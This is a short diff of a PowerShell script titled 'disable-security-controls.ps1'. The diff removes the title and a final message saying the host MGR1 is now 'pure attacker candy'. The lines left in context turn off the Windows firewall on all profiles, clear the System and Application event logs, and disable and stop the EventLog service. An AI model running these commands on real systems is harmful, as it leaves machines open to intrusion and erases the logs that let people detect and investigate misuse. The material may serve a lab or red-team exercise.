@@ -1,5 +1,3 @@
-# disable-security-controls.ps1
-
 # Firewall
 netsh advfirewall set allprofiles state off
 
@@ -17,5 +15,3 @@ wevtutil cl System
 wevtutil cl Application
 Set-Service EventLog -StartupType Disabled -ErrorAction SilentlyContinue
 Stop-Service EventLog -Force -ErrorAction SilentlyContinue
-
-Write-Host "`nAll security controls disabled MGR1 is now pure attacker candy" -ForegroundColor Red
